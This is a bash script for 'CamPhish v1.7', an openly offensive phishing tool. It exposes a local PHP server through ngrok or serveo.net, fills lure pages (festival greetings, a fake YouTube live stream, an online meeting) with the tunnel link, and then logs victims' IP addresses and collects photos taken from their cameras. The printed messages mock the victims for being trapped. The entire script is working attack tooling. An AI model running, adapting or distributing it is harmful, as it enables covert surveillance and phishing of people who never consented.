#!/bin/bash
# CamPhish v1.7
# Powered by Irsyah
# Credits goes to thelinuxchoice [github.com/thelinuxchoice/]

trap 'printf "\n";stop' 2

# Platform detection
PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
IS_DARWIN=false
IS_LINUX=false
IS_TERMUX=false
IS_WINDOWS=false
case "$PLATFORM" in
	Darwin*) IS_DARWIN=true ;; 
	Linux*) 
		IS_LINUX=true
		# detect Termux (Android) by presence of /data/data/com.termux
		if [ -d "/data/data/com.termux" ] || [ -n "$PREFIX" -a "$PREFIX" = "/data/data/com.termux/files/usr" ]; then
			IS_TERMUX=true
		fi
		;;
	MINGW*|MSYS*|CYGWIN*) IS_WINDOWS=true ;; 
	*) ;;
esac

# Portable check for command
has_cmd() { command -v "$1" >/dev/null 2>&1; }

# Kill processes listening on a port (portable across fuser/lsof/netstat)
kill_port() {
	port="$1"
	if has_cmd fuser; then
		fuser -k ${port}/tcp > /dev/null 2>&1 || true
		return
	fi
	if has_cmd lsof; then
		pids=$(lsof -t -i tcp:"${port}" 2>/dev/null || true)
		if [ -n "$pids" ]; then
			echo "$pids" | xargs -r kill -2 >/dev/null 2>&1 || true
			return
		fi
	fi
	if has_cmd netstat && has_cmd awk && has_cmd grep; then
		# try to find PID from netstat (platform-dependent output)
		pid=$(netstat -nlp 2>/dev/null | grep ":${port} " | awk '{print $7}' | cut -d'/' -f1 | head -n1)
		if [ -n "$pid" ]; then
			kill -2 "$pid" >/dev/null 2>&1 || true
			return
		fi
	fi
}

banner() {
clear
printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
printf " \e[1;93m CamPhish Ver 1.7 \e[0m \n"
printf " \e[1;91m Tools Name : SAP-SAP.TOOLS > PAZ.Pemuda Akhir Zaman | Somnium :> \e[0m \n"


printf " \e[1;92m Jika kau mencintainya , maka dekati dulu sang pencitanya :> \e[0m \n"

printf " \e[1;77m Niscaya kau Akan mendapatkanya \e[0m \n"

printf " \e[1;92m I love Her \e[0m \n"

printf " \e[1;77m #jODOH TUH DAH DITENTUKAN =＾● ⋏ ●＾=  \e[0m \n"

printf "\n"

 
}

dependencies() {
	# Basic dependencies; be permissive and show clear guidance for Windows
	if ! has_cmd php ; then
		echo >&2 "I require php but it's not installed. Install it (php-cli). Aborting."; exit 1;
	fi
	if ! has_cmd curl ; then
		echo >&2 "Warning: 'curl' not found. Some operations may fail. Install curl for best results.";
	fi
	if ! has_cmd ssh && ! $IS_WINDOWS ; then
		echo >&2 "Warning: 'ssh' not found. Serveo option requires ssh. Install OpenSSH.";
	fi
	if ! has_cmd unzip && ! $IS_WINDOWS ; then
		echo >&2 "Warning: 'unzip' not found. Ngrok autoinstall may fail. Install unzip/wget.";
	fi
	if $IS_WINDOWS ; then
		echo "Running on Windows environment detected. For full functionality use WSL, Git-Bash, Cygwin or Termux on Android. Script may not work natively on Windows CMD/Powershell.";
	fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets, Tunggunya Ambil Ngopi Dah\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!YAHAHA Dia Sudah KeJebak\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!Tuh Dah Ke Simpen Fotonya\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

has_cmd ssh || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo Sever Hatinya...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R ${subdomain}:80:localhost:3333 serveo.net > sendlink 2>&1" &

sleep 10
else
$(which sh) -c "ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1" &

sleep 10
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server Bukan PHP In Dia yehhh... (localhost:3333)\e[0m\n"
kill_port 3333
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
# extract serveo url (allow hyphens, dots and mixed case) and set link for downstream use
send_link=$(grep -o "https://[0-9A-Za-z.-]*\.serveo.net" sendlink | head -n1)
link="$send_link"
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$link"

}


payload_ngrok() {

# try to read public_url from ngrok's local API (handles ngrok.io, ngrok-free.app, etc.)
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^\"]*' | head -n1 | cut -d'"' -f4)
if [[ -z "$link" ]]; then
	# fallback: any https url in the API response
	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"]*' | head -n1)
fi
# escape '&' in link to avoid sed replacement issues
link_esc=$(printf '%s' "$link" | sed 's/[&]/\\&/g')
sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html

}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again Aiwah Cok Yang bener dong\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again bENER dONG bro\e[0m\n"
sleep 1
select_template
fi
fi
}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting.Aiwah Cok"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting.Awah Cok"; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
arch3=$(uname -a | grep -o 'aarch64' | head -n1)
arch4=$(uname -a | grep -o 'Darwin' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] && [[ $arch4 != *'Darwin'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-v3-stable-linux-arm.zip ]]; then
unzip ngrok-v3-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-v3-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
elif [[ $arch3 == *'aarch64'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip > /dev/null 2>&1
 
if [[ -e ngrok-v3-stable-linux-arm64.zip ]]; then
unzip ngrok-v3-stable-linux-arm64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-v3-stable-linux-arm64.zip
else
printf "\e[1;93m[!] Download error...TOLOLL\e[0m\n"
exit 1
fi
elif [[ $arch4 == *'Darwin'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip> /dev/null 2>&1
 
if [[ -e ngrok-v3-stable-darwin-arm64.zip ]]; then
unzip ngrok-v3-stable-darwin-arm64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-v3-stable-darwin-arm64.zip
else
printf "\e[1;93m[!] Download error...\e[0m\n"
exit 1
fi

else
wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1 
if [[ -e ngrok-v3-stable-linux-amd64.zip ]]; then
unzip ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-v3-stable-linux-amd64.zip
else
printf "\e[1;93m[!] Download error... Lahhh\e[0m\n"
exit 1
fi
fi
fi

# Ngrok authtoken setup - automatic and flexible
printf "\e[1;92m[\e[0m+\e[1;92m] Configuring ngrok authtoken...\n"
if [[ -e ~/.ngrok2/ngrok.yml ]]; then
	printf "\e[1;93m[\e[0m*\e[1;93m] ngrok authtoken already configured.\n"
	read -p $'\e[1;92m[\e[0m+\e[1;92m] Use existing token or enter new one? (E=existing / N=new) [Default: E]: \e[0m' token_choice
	token_choice="${token_choice:-E}"
	if [[ "$token_choice" == "N" || "$token_choice" == "n" ]]; then
		read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
		if [[ -n "$ngrok_auth" ]]; then
			./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
			sleep 1
			printf "\e[1;92m[\e[0m*\e[1;92m] Authtoken updated.\n"
		fi
	fi
else
	printf "\e[1;93m[\e[0m*\e[1;93m] No ngrok authtoken found. Getting one from https://dashboard.ngrok.com/auth/your-authtoken\n"
	read -p $'\e[1;92m[\e[0m+\e[1;92m] Enter your ngrok authtoken: \e[0m' ngrok_auth
	if [[ -n "$ngrok_auth" ]]; then
		./ngrok authtoken "$ngrok_auth" > /dev/null 2>&1
		sleep 1
		printf "\e[1;92m[\e[0m*\e[1;92m] Authtoken configured.\n"
	else
		printf "\e[1;31m[!] No authtoken provided. Cannot continue.\n"
		exit 1
	fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server (localhost:3333)...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok tunnel...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"https://[^\"]*' | head -n1 | cut -d'"' -f4)
if [[ -z "$link" ]]; then
	link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/\"]*' | head -n1)
fi
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason lahh  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid lu mah\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on alamakkk\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok lah lumah\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection Modal Dulu Bos\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

camphish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Choose tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option Plih satu Jangan Dua ntar Disangka Selingkuh: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template
if [[ $option_server -eq 2 ]]; then

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!Baca Tolol\e[0m\n"
sleep 1
clear
camphish
fi

}


payload() {

send_link=$(grep -o "https://[0-9A-Za-z.-]*\.serveo.net" sendlink | head -n1)
link="$send_link"
# escape '&' in link to avoid sed replacement issues
link_esc=$(printf '%s' "$link" | sed 's/[&]/\\&/g')
sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
fi
rm -rf index3.html

}

start() {

default_choose_sub="Y"
default_subdomain="saycheese$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain?bukan dia (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
camphish
